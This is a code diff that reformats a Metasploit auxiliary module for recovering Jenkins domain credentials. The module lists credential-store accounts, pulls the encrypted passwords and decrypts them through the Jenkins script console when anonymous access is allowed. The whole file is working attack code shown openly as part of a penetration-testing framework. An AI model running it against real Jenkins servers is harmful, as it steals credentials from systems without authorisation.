@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,43 +8,41 @@ require 'msf/core'
 require 'json'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Jenkins Domain Credential Recovery',
-      'Description'    => %q{
-        This module will collect Jenkins domain credentials, and uses
-        the script console to decrypt each password if anonymous permission
-        is allowed.
+                      'Name'           => 'Jenkins Domain Credential Recovery',
+                      'Description'    => %q(
+                        This module will collect Jenkins domain credentials, and uses
+                        the script console to decrypt each password if anonymous permission
+                        is allowed.
 
-        It has been tested against Jenkins version 1.590, 1.633, and 1.638.
-      },
-      'Author'         =>
-        [
-          'Th3R3p0', # Vuln Discovery, PoC
-          'sinn3r'   # Metasploit
-        ],
-      'References'     =>
-        [
-          [ 'EDB', '38664' ],
-          [ 'URL', 'http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html' ]
-        ],
-      'DefaultOptions' =>
-        {
-          'RPORT' => 8080
-        },
-      'License'        => MSF_LICENSE
-    ))
+                        It has been tested against Jenkins version 1.590, 1.633, and 1.638.
+                      ),
+                      'Author'         =>
+                        [
+                          'Th3R3p0', # Vuln Discovery, PoC
+                          'sinn3r'   # Metasploit
+                        ],
+                      'References'     =>
+                        [
+                          [ 'EDB', '38664' ],
+                          [ 'URL', 'http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html' ]
+                        ],
+                      'DefaultOptions' =>
+                        {
+                          'RPORT' => 8080
+                        },
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
         OptString.new('TARGETURI',     [true, 'The base path for Jenkins', '/']),
         OptString.new('JENKINSDOMAIN', [true, 'The domain where we want to extract credentials from', '_'])
-      ], self.class)
+      ], self.class
+    )
   end
-
 
   # Returns the Jenkins version.
   #
@@ -51,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
   # @return [NilClass] No Jenkins version found.
   def get_jenkins_version
     uri = normalize_uri(target_uri.path)
-    res = send_request_cgi({ 'uri' => uri })
+    res = send_request_cgi('uri' => uri)
 
     unless res
       fail_with(Failure::Unknown, 'Connection timed out while finding the Jenkins version')
@@ -63,14 +62,12 @@ class MetasploitModule < Msf::Auxiliary
     version.scan(/jenkins\-([\d\.]+)/).flatten.first
   end
 
-
   # Returns the Jenkins domain configured by the user.
   #
   # @return [String]
   def domain
     datastore['JENKINSDOMAIN']
   end
-
 
   # Returns a check code indicating the vulnerable status.
   #
@@ -81,13 +78,10 @@ class MetasploitModule < Msf::Auxiliary
 
     # Default version is vulnerable, but can be mitigated by refusing anonymous permission on
     # decryption API. So a version wouldn't be adequate to check.
-    if version
-      return Exploit::CheckCode::Detected
-    end
+    return Exploit::CheckCode::Detected if version
 
     Exploit::CheckCode::Safe
   end
-
 
   # Returns all the found Jenkins accounts of a specific domain. The accounts collected only
   # include the ones with the username-and-password kind. It does not include other kinds such
@@ -101,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.path, 'credential-store', 'domain', domain)
     uri << '/'
 
-    res = send_request_cgi({ 'uri'=>uri })
+    res = send_request_cgi('uri' => uri)
 
     unless res
       fail_with(Failure::Unknown, 'Connection timed out while enumerating accounts.')
@@ -133,7 +127,6 @@ class MetasploitModule < Msf::Auxiliary
     users
   end
 
-
   # Returns the found encrypted password from the update page.
   #
   # @param id [String] The ID of a specific account.
@@ -142,7 +135,7 @@ class MetasploitModule < Msf::Auxiliary
   # @return [NilCass] No encrypted password found.
   def get_encrypted_password(id)
     uri = normalize_uri(target_uri.path, 'credential-store', 'domain', domain, 'credential', id, 'update')
-    res = send_request_cgi({ 'uri'=>uri })
+    res = send_request_cgi('uri' => uri)
 
     unless res
       fail_with(Failure::Unknown, 'Connection timed out while getting the encrypted password')
@@ -160,7 +153,6 @@ class MetasploitModule < Msf::Auxiliary
     nil
   end
 
-
   # Returns the decrypted password by using the script console.
   #
   # @param encrypted_pass [String] The encrypted password.
@@ -169,15 +161,13 @@ class MetasploitModule < Msf::Auxiliary
   # @return [NilClass] No decrypted password found (no result found on the console)
   def decrypt(encrypted_pass)
     uri  = normalize_uri(target_uri, 'script')
-    res  = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => uri,
-      'vars_post' => {
-        'script' => "hudson.util.Secret.decrypt '#{encrypted_pass}'",
-        'json'   => {'script' => "hudson.util.Secret.decrypt '#{encrypted_pass}'"}.to_json,
-        'Submit' => 'Run'
-      }
-    })
+    res  = send_request_cgi('method' => 'POST',
+                            'uri'       => uri,
+                            'vars_post' => {
+                              'script' => "hudson.util.Secret.decrypt '#{encrypted_pass}'",
+                              'json'   => { 'script' => "hudson.util.Secret.decrypt '#{encrypted_pass}'" }.to_json,
+                              'Submit' => 'Run'
+                            })
 
     unless res
       fail_with(Failure::Unknown, 'Connection timed out while accessing the script console')
@@ -200,7 +190,6 @@ class MetasploitModule < Msf::Auxiliary
     nil
   end
 
-
   # Decrypts an encrypted password for a given ID.
   #
   # @param id [String] Account ID.
@@ -211,7 +200,6 @@ class MetasploitModule < Msf::Auxiliary
     encrypted_pass = get_encrypted_password(id)
     decrypt(encrypted_pass)
   end
-
 
   # Reports the username and password to database.
   #
@@ -237,10 +225,8 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service_data)
 
     if opts[:password]
-      credential_data.merge!(
-        private_data: opts[:password],
-        private_type: :password
-      )
+      credential_data[:private_data] = opts[:password]
+      credential_data[:private_type] = :password
     end
 
     login_data = {
@@ -251,7 +237,6 @@ class MetasploitModule < Msf::Auxiliary
 
     create_credential_login(login_data)
   end
-
 
   def run
     users = get_users
@@ -277,19 +262,15 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
-  def print_status(msg='')
+  def print_status(msg = '')
     super("#{peer} - #{msg}")
   end
 
-
-  def print_good(msg='')
+  def print_good(msg = '')
     super("#{peer} - #{msg}")
   end
 
-
-  def print_error(msg='')
+  def print_error(msg = '')
     super("#{peer} - #{msg}")
   end
-
 end
